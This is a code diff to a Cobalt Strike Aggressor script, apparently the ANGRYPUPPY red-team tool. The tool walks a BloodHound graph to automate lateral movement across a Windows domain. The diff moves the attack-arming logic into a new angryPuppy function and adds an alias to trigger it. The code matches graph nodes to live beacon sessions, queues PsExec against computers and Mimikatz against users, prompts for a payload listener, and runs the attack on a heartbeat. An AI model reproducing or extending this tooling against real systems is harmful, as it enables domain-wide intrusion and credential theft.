@@ -141,7 +141,6 @@ sub sortNodes {
 }
 
 sub removeGroups {
-	
 	@nodes = $1;
 
 	foreach $i => $item (@nodes){
@@ -179,70 +178,6 @@ sub parseGraph {
 
     @final = removeGroups(@nodelist);
 
-    # Set currentBid to first node
-
-    # If Start node is a computer
-
-    if (@final[0]["type"] eq "Computer"){
-        println("First computer detected [!!!]");
-        $cLabel = @final[0]["label"];
-        foreach $session (beacons()) {
-            if ($cLabel eq $session["computer"]) {
-                $currentBid = $session["id"];
-            }
-        }
-    }
-    else{
-        println("First user detected [!!!]");
-        # Start node is a user
-        $uLabel = uc(@final[0]["label"]);
-        println($uLabel);
-        foreach $session (beacons()) {
-            println($uLabel . " vs ". uc($session["user"]));
-            if ($uLabel eq uc($session["user"])) {
-                $currentBid = $session["id"];
-            }
-        }
-    }
-
-    foreach %a (@final){
-        if (%a["type"] eq "Computer"){
-            println("PSEXEC to " . %a["label"]);
-        }
-        else{
-            println("Mimikatz for " . %a["label"]);
-        }
-    }
-
-    elog("[*] CurrentBid is $currentBid");
-
-    $AttackActive = $False;
-
-    # $currentBid is now the start node.
-
-    # PROMPT WHAT LISTENER TO USE
-
-    openPayloadHelper(lambda({
-    	$listener = $1;
-        $psexec = $False;
-        $mimikatz = $False;
-        @rSet = @("a","b","c","d","e","f","0","1","2","3","4","5","6","7","8","9");
-
-        $rString = "";
-        for ($x = 0; $x lt 7; $x++){
-            $rString = $rString . rand(@rSet);
-        }
-
-        $randomPuppy = "[". $rString . "]";
-
-        # Reset waitFor
-        $waitFor = "";
-
-        $attackActive = $True;
-        elog("[*] ANGRYPUPPY activated: $randomPuppy");
-
-        $pos = 0;
-	}, $bids => $1));
 }
 
 sub getToken {
@@ -382,11 +317,81 @@ sub executeAttack {
     }
 }
 
+sub angryPuppy {
+    # Set currentBid to first node
+    # If Start node is a computer
+
+    if (@final[0]["type"] eq "Computer"){
+        println("First computer detected [!!!]");
+        $cLabel = @final[0]["label"];
+        foreach $session (beacons()) {
+            if ($cLabel eq $session["computer"]) {
+                $currentBid = $session["id"];
+            }
+        }
+    }
+    else{
+        println("First user detected [!!!]");
+        # Start node is a user
+        $uLabel = uc(@final[0]["label"]);
+        println($uLabel);
+        foreach $session (beacons()) {
+            println($uLabel . " vs ". uc($session["user"]));
+            if ($uLabel eq uc($session["user"])) {
+                $currentBid = $session["id"];
+            }
+        }
+    }
+
+    foreach %a (@final){
+        if (%a["type"] eq "Computer"){
+            println("PSEXEC to " . %a["label"]);
+        }
+        else{
+            println("Mimikatz for " . %a["label"]);
+        }
+    }
+
+    elog("[*] CurrentBid is $currentBid");
+
+    $AttackActive = $False;
+
+    # $currentBid is now the start node.
+
+    # PROMPT WHAT LISTENER TO USE
+
+    openPayloadHelper(lambda({
+        $listener = $1;
+        $psexec = $False;
+        $mimikatz = $False;
+        @rSet = @("a","b","c","d","e","f","0","1","2","3","4","5","6","7","8","9");
+
+        $rString = "";
+        for ($x = 0; $x lt 7; $x++){
+            $rString = $rString . rand(@rSet);
+        }
+
+        $randomPuppy = "[". $rString . "]";
+
+        # Reset waitFor
+        $waitFor = "";
+
+        $attackActive = $True;
+        elog("[*] ANGRYPUPPY activated: $randomPuppy");
+
+        $pos = 0;
+    }, $bids => $1));
+}
+
 on heartbeat_1s{
 
     if ($attackActive eq $True){
         executeAttack();
     }	# End $AttackActive
+}
+
+alias angrypuppy {
+    angryPuppy();
 }
 
 parseGraph(getFileProper(script_resource("graphs"), "graph4.json"));
